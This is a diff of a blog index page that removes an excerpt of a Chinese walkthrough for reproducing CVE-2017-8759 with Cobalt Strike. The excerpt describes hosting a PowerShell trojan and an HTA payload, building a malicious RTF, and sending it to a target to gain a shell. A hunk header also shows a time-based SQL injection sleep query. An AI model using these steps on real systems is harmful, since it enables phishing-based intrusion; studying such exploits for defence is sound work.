-<li>设置攻击环境：<br>6.1 <code>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery</code>，启动一个powershell木马，设置如下图：<br><img src="/images/3ca379232e73ccf4c29bddeef9a1ed09b20ecbf7.png" alt="微信截图_20170928122539.png"><br>点击”Launch”之后，会生成一个一句话的Powershell代码，记住其中的网址部分，填写到<code>cmd.jpg</code>中，替换掉url。<br>6.2 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>，将<code>cmd.jpg</code>，一定要将<code>Mime Type</code>修改为<code>application/hta</code>，此处生成的<code>URL</code>请填入<code>exploit.txt</code>中相应的位置。<br>6.3 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>，将<code>exploit.txt</code>，无需特殊设置，设置好<code>Local URI</code>，点击<code>Launch</code>，复制生成的URL。此<code>URL</code>为<code>CreateRTF.py</code>脚本<code>-u</code>参数使用的。<br>6.3 使用大神的<code>CreatRTF.py</code>生成一个rtf文档，url填写为Host <code>exploit.txt</code>时产生的url。</li>
-</ol>
-<p>至此，步骤完成，将生成的rtf文档发送给目标，即可在cobalt strike teamserver上得到shell。</p>
-<p>##注意事项</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1460,7 +1452,7 @@ mysql> select if(1<0,sleep(5),sleep(2)); 0 1 +---------------------------+ | if(
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-count">63</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1508,7 +1500,7 @@ mysql> select if(1<0,sleep(5),sleep(2)); 0 1 +---------------------------+ | if(
 <div class="copyright">
   
   &copy; 2017 – 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
